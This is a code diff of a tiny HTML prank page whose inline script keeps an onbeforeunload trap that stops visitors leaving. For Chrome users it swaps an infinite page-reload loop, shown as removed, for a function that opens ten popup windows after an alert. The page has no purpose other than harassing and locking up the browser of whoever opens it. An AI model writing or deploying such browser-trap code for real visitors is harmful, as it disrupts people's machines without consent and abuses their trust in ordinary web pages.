@@ -1,15 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>123</title>
+  <title>ok</title>
   <script type="text/javascript">
     onbeforeunload = () => true;
+
+    function openMultiplePopups(count) {
+      for (let i = 0; i < count; i++) {
+        const url = 'http://example.com'; // Replace with the desired URL
+        window.open(url, 'popUpWindow' + i, 'height=300,width=400,left=100,top=100');
+      }
+    }
 
     if (navigator.userAgent.indexOf("Chrome") != -1) {
       alert(':3');
       setTimeout(function(){
-        while(1)
-          location.reload(1);
+        openMultiplePopups(10); // Change the number to open the desired count of popups
       }, 1000);
     } else {
       alert(':33');
